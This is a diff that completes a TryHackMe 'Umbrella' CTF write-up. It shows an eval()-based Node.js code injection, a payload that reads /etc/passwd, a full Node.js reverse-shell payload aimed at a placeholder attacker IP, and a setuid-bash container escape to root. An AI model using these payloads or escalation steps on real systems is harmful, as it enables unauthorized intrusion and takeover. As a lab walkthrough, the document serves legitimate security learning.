@@ -16,11 +16,11 @@ cover:
 
 ![header](img/header.png#center)
 
-|  **Room** 	| WhyHackMe                                          	|
+|  **Room** 	| Umbrella                                          	|
 |:--------------:	|----------------------------------------------------	|
 |     **OS**     	| Linux                                              	|
 | **Difficulty** 	| Medium                                             	|
-|  **Room Link** 	| [https://tryhackme.com/room/whyhackme](https://tryhackme.com/room/umbrella)               	|
+|  **Room Link** 	| [https://tryhackme.com/room/umbrella](https://tryhackme.com/room/umbrella)               	|
 |   **Creator**  	| [brunofight](https://tryhackme.com/p/brunofight) 	|
 
 # Recon 
@@ -266,11 +266,11 @@ Using [crackstation.net](https://crackstation.net) , we can crack those password
 
 It is a simple login page.
 
-img
+![header](img/login-page.png#center)
 
 Our Nmap scan & Docker registry enumeration indicates that it is a `Node.js` container application.
 
-Running feroxbuster against the site yeilded nothing interesting.
+Running feroxbuster against the site yielded nothing interesting.
 
 ```bash
 sh3bu@Ubuntu:~/thm/umbrella$ feroxbuster -w ~/opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -u http://$ip/ -x php,json,bak,pl,sh,html,asp,aspx,cgi,rb -C 404 -o  recon/scans/feroxbuster.out
@@ -298,4 +298,216 @@ by Ben "epi" Risher 🤓                 ver: 2.10.1
 403      GET        9l       28w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
 301      GET       10l       16w      173c http://10.10.79.214:8080/css => http://10.10.79.214:8080/css/
 200      GET      135l      273w     2558c http://10.10.79.214:8080/css/style.css
+```
+
+With the credentials I got previously from MYSQL , I was able to login to the site as `claire-r`.
+
+![header](img/increase-time.png#center)
+
+The site has the following tip 
+> You can also use mathematical expressions, eg. `5+4`
+
+This made me think if SSTI exists. So I entered the following payload`9*10` in order to increase the time spent by 90 minutes & it did!
+
+![header](img/template-injection.png#center)
+
+So I was trying several Node.Js based SSTI payloads that would result in an RCE. But nothing worked & I was stuck here for a long time.
+
+After taking a break I returned back with a fresh mind. Without overcomplicating, I went ahead and tried to ssh in as **claire-r** with the obtained password & to my surprise it worked!
+But still we're not inside the container.
+
+Grab the `user.txt` 🚩
+```bash
+sh3bu@Ubuntu:~/thm/umbrella$ ssh claire-r@10.10.79.214
+The authenticity of host '10.10.79.214 (10.10.79.214)' can't be established.
+ED25519 key fingerprint is SHA256:4O8itcDPWBL0nD2ELrDFEMiWY9Pn8UuEdRRP7L8pxr8.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.79.214' (ED25519) to the list of known hosts.
+claire-r@10.10.79.214's password: 
+Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+ System information disabled due to load higher than 1.0
+
+20 updates can be applied immediately.
+To see these additional updates run: apt list --upgradable
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+claire-r@ctf:~$ id
+uid=1001(claire-r) gid=1001(claire-r) groups=1001(claire-r)
+
+claire-r@ctf:~$ cat user.txt 
+THM{d832c0*********************25e}
+```
+The `timetracker-src` folder in the home directory had all the files related to Node.js container application. The `docker-compose.yml` had the following contents.
+
+```bash
+claire-r@ctf:~/timeTracker-src$ cat docker-compose.yml 
+version: '3.3'
+services:
+  db:
+    image: mysql:5.7
+    restart: always
+    environment:
+      MYSQL_DATABASE: 'timetracking'
+      MYSQL_ROOT_PASSWORD: 'Ng************5'
+    ports:
+      - '3306:3306'     
+    volumes:
+      - ./db:/docker-entrypoint-initdb.d
+  app:
+    image: umbrella/timetracking:latest
+    restart: always
+    ports:
+      - '8080:8080'
+    volumes:
+      - ./logs:/logs
+```
+
+Notice that the `./logs` directory of the host is mounted to `/logs` directory on the container. So it might be an misconfigured container through which we could escape the container & get a shell on the host machine.
+
+The `logs` directory inside the `~/home/claire-r/` has the following file - `tt.logs`
+```bash
+claire-r@ctf:~/timeTracker-src/logs$ ls -al
+total 1220
+drwxrw-rw- 2 claire-r claire-r    4096 Jan 26 17:01 .
+drwxrwxr-x 6 claire-r claire-r    4096 Dec 22  2022 ..
+-rwsr-sr-x 1 root     root     1234376 Jan 26 17:01 bash
+-rw-r--r-- 1 root     root         359 Jan 26 16:43 tt.log
+```
+
+The `app.js` file had the source code for the container application running at port 8080.
+```bash
+// http://localhost:8080/time
+app.post('/time', function(request, response) {
+	
+    if (request.session.loggedin && request.session.username) {
+
+        let timeCalc = parseInt(eval(request.body.time));
+		let time = isNaN(timeCalc) ? 0 : timeCalc;
+        let username = request.session.username;
+
+		connection.query("UPDATE users SET time = time + ? WHERE user = ?", [time, username], function(error, results, fields) {
+			if (error) {
+				log(error, "error")
+			};
+
+			log(`${username} added ${time} minutes.`, "info")
+			response.redirect('/');
+		});
+	} else {
+        response.redirect('/');;	
+    }
+	
+});
+```
+
+So from the above snippet, its clear that our user input is being passed to `eval()` which is a very unsafe way to deal with user input.
+
+So I searched online for Node.js RCE payloads & this one worked.
+
+```js
+arguments[1].end(require('child_process').execSync('cat /etc/passwd'))
+```
+
+![header](img/rce.png#center)
+
+But when I replaced the  _cat /etc/passwd_ payload with any other reverse shell payload, it didn't work. 
+
+Finally, I got the below payload from [revshells.com](https://revshells.com) made by [0dayctf](https://tryhackme.com/p/0day) through which I was able to get reverse shell back to my machine.
+
+```js
+(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("sh", []); var client = new net.Socket(); client.connect(9001, "<ip>", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/;})();
+```
+And we're root on the container !
+
+```bash
+sh3bu@Ubuntu:~/thm/umbrella$ pwncat-cs -lp 9001
+/home/sh3bu/.local/lib/python3.11/site-packages/paramiko/transport.py:178: CryptographyDeprecationWarning: Blowfish has been deprecated
+  'class': algorithms.Blowfish,
+[22:04:51] Welcome to pwncat 🐈!                                                                            __main__.py:164
+[22:13:48] received connection from 10.10.202.14:36394                                                           bind.py:84
+[22:13:51] 0.0.0.0:9001: upgrading from /bin/dash to /bin/bash                                               manager.py:957
+[22:13:54] 10.10.202.14:36394: registered new host w/ db                                                     manager.py:957
+(local) pwncat$ 
+                                                                                                                                                                                                                                
+(remote) root@de0610f51845:/usr/src/app# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+The `logs` directory which we saw in the host machine as claire-r was also present in the root directory of the container as mentioned in the **docker-compose.yml** file.
+
+```
+(remote) root@de0610f51845:/# pwd
+/
+(remote) root@de0610f51845:/# ls -al
+total 76
+drwxr-xr-x   1 root root 4096 Dec 22  2022 .
+drwxr-xr-x   1 root root 4096 Dec 22  2022 ..
+-rwxr-xr-x   1 root root    0 Dec 22  2022 .dockerenv
+drwxr-xr-x   2 root root 4096 Dec 19  2022 bin
+drwxr-xr-x   2 root root 4096 Dec  9  2022 boot
+drwxr-xr-x   5 root root  340 Jan 26 16:32 dev
+drwxr-xr-x   1 root root 4096 Dec 22  2022 etc
+drwxr-xr-x   1 root root 4096 Dec 21  2022 home
+drwxr-xr-x   1 root root 4096 Dec 19  2022 lib
+drwxr-xr-x   2 root root 4096 Dec 19  2022 lib64
+drwxrw-rw-   2 1001 1001 4096 Dec 22  2022 logs
+drwxr-xr-x   2 root root 4096 Dec 19  2022 media
+drwxr-xr-x   2 root root 4096 Dec 19  2022 mnt
+drwxr-xr-x   1 root root 4096 Dec 21  2022 opt
+dr-xr-xr-x 176 root root    0 Jan 26 16:32 proc
+drwx------   1 root root 4096 Dec 21  2022 root
+drwxr-xr-x   3 root root 4096 Dec 19  2022 run
+drwxr-xr-x   2 root root 4096 Dec 19  2022 sbin
+drwxr-xr-x   2 root root 4096 Dec 19  2022 srv
+dr-xr-xr-x  13 root root    0 Jan 26 16:32 sys
+drwxrwxrwt   1 root root 4096 Dec 21  2022 tmp
+drwxr-xr-x   1 root root 4096 Dec 19  2022 usr
+drwxr-xr-x   1 root root 4096 Dec 19  2022 var
+
+(remote) root@de0610f51845:/# ls logs/
+tt.log
+```
+
+So we have shell access to claire-r on the host machine & also root on the container. How can we privesc  & gain a shell as root on the host machine?
+
+The below post by [Hacktricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells)
+
+Also give this one a read - [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)
+
+So in our case, from the root user of the container we can copy the **/bin/bash** binary to the **/logs/** directory & make it a **setuid binary**.
+
+```bash
+(remote) root@de0610f51845:/# cp /bin/bash /logs/ && chmod +xs /logs/bash 
+
+(remote) root@de0610f51845:/# ls -al logs/
+total 1220
+drwxrw-rw- 2 1001 1001    4096 Jan 26 17:01 .
+drwxr-xr-x 1 root root    4096 Dec 22  2022 ..
+-rwsr-sr-x 1 root root 1234376 Jan 26 17:01 bash
+-rw-r--r-- 1 root root     359 Jan 26 16:43 tt.log
+```
+
+Now we can switch back to claire-r's shell & run the bash binary present in  `~/timeTracker-src/logs/` directory to get a shell as **root** on the host machine.
+
+Grab the `root.txt` 🚩 
+```bash
+claire-r@ctf:~/timeTracker-src/logs$ ./bash -p
+bash-5.1# id
+uid=1001(claire-r) gid=1001(claire-r) euid=0(root) egid=0(root) groups=0(root),1001(claire-r)
+bash-5.1# cat /root/root.txt 
+THM{1e15f****************************ab2}
 ```
